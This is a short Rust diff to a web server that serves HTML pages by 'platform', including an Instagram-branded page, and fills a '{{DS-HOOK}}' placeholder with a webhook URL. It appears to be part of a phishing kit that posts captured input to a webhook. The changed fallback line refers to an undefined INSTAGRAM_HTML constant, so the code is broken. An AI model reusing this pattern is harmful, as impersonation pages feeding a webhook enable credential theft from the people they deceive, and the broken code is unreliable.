@@ -8,8 +8,9 @@ pub struct Server {
     pub port: u16,
 }
 
-const INSTAGRAM_PAGE: &str =
-    include_str!("pages/basic.html");
+const BASIC_PAGE: &str = include_str!("pages/basic.html");
+const INSTAGRAM_PAGE: &str =  include_str!("pages/instagram.html");
+
 
 
 pub fn start_server(
@@ -105,7 +106,8 @@ pub fn start_server(
 fn page(platform: &str, webhook_url: &str) -> String {
 
     match platform {
+        "basic" => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
         "instagram" => INSTAGRAM_PAGE.replace("{{DS-HOOK}}", webhook_url),
-        _ => INSTAGRAM_PAGE.replace("{{DS-HOOK}}", webhook_url),
+        _ => INSTAGRAM_HTML.replace("{{DS-HOOK}}", webhook_url),
     }
 }
